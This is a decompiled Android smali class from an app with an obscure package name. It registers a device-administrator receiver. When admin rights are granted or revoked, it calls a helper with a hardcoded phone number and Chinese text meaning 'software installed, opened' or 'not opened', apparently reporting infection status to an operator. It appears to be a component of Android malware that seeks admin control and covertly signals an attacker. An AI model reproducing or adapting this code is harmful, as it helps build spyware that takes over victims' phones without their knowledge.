.class public Lcom/kk/liushiwu/com/zz/a;
.super Landroid/app/admin/DeviceAdminReceiver;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 1

    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;

    move-result-object v0

    return-object v0
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    const-string v0, "18317195964"

    const-string v1, "\u8f6f  \u4ef6 \u5df2 \u5b89 \u88c5\uff0c\u672a \u6253 \u5f00"

    invoke-static {p1, v0, v1}, Lcom/kk/liushiwu/com/zz/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onDisabled(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    const-string v0, "18317195964"

    const-string v1, "\u8f6f  \u4ef6 \u5df2 \u5b89 \u88c5\uff0c\u5df2 \u6253 \u5f00"

    invoke-static {p1, v0, v1}, Lcom/kk/liushiwu/com/zz/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onEnabled(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method
